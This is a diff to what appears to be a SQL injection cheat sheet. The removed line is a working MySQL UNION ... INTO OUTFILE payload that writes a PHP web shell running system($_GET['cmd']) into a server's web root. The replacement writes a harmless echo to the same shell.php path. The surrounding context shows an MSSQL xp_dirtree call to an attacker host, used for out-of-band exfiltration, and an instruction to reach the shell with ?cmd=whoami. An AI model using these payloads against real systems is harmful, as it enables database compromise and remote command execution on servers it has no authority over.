@@ -170,7 +170,7 @@ EXEC('master..xp_dirtree "\\' + @host + '\foobar$"');
 ### MySQL: INTO OUTFILE
 If the DB user has `FILE` privileges and you know the web root path:
 ```sql
-' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -
+' UNION SELECT '<?php echo "shell"; ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -
 ```
 Access via `http://target.com/shell.php?cmd=whoami`.
 
